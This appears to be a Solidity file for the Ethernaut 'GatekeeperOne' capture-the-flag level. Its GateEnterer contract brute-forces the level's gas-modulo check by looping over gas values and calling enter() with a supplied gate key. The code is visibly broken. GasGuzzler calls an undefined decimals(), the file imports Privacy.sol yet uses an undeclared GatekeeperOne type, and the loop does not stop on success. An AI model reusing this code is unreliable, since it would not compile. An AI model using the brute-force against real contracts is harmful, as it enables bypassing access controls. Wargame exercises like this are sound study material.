// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Privacy.sol";

contract GasGuzzler {
    uint256 public gasCounter;

    function gasUsed() public returns (uint){
        uint256 a = 1000000 * (10**uint256(decimals()));
        return gasCounter;
    }

    function txOrigin() public view returns (address){
        return tx.origin;
    }

    function msgSender() public view returns (address){
        return msg.sender;
    }

}

contract GateEnterer {

event Failed(bytes reason, uint gas);


 function callTwoGateEnterer(address _addr, bytes8 _gateKey) public { 
     GatekeeperOne gatekeeperOne = GatekeeperOne(_addr);

     for (uint i = 150; i < 270; i++) {
         try gatekeeperOne.enter{gas: i + 8191 * 3}(_gateKey) {}
         catch (bytes memory reason) {
             emit Failed(reason, i + 8191 * 3);
            }
        }

    }
}